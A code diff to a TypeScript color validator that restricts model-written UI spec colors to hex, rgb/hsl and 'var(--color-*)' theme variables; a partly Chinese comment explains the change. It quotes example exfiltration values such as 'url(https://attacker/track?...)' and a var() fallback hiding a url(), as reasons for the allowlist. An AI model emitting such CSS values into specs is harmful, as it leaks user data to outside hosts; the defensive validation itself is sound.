@@ -155,10 +155,19 @@ function identifiersOk(v: Record<string, unknown>): boolean {
  * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
  * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
  * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
- * functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
- * to the component's default palette.
+ * functions, and host theme variables. Anything else degrades to the
+ * component's default palette.
+ *
+ * CGUI-PATCH(INTERFACE §2.7):变量那一档从 `var(--dsw-*)` 换成 `var(--color-*)`。
+ * 契约给模型的四种形态是 hex / rgb(a) / hsl(a) / **CC-GUI 主题变量**,而 CC-GUI 的
+ * 主题变量就叫 `--color-*`(`var(--color-accent)` / `var(--color-ink)`);`--dsw-*` 是
+ * 上游自己设计系统的名字,模型无从知道也不该用。
+ * 只影响 guard 对**模型写的 spec 字段**的校验;上游 CSS 文件内部照旧用 `--dsw-*`
+ * 写组件默认色,那条路不经过这里。
+ * "任意 var(--其他前缀)"按契约明确拒绝 —— 前缀写死,不许放宽成 `var(--[\w-]+)`,
+ * 否则 `var(--x, url(https://…))` 这类兜底值又把外发通道开回来。
  */
-const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/
+const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--color-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/
 
 function color(v: unknown): string | undefined {
   if (typeof v !== 'string') return undefined
